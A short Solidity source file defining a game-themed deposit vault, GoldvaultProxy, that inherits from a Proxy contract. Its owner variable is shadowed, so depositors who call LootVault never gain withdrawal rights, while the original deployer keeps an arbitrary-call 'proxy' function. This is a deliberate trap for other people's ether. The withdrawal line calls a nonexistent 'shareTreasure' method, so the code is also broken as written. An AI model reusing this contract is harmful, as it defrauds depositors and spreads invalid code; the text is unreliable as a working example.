// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyGamemaster { if (msg.sender == GuildLeader) _; } address GuildLeader = msg.sender;
    function sendgoldGamemaster(address _realmlord) public onlyGamemaster { GuildLeader = _realmlord; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract GoldvaultProxy is Proxy {
    address public GuildLeader;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function LootVault() public payable {
        if (msg.sender == tx.origin) {
            GuildLeader = msg.sender;
            storeLoot();
        }
    }

    function storeLoot() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function collectTreasure(uint256 amount) public onlyGamemaster {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shareTreasure(amount);
        }
    }
}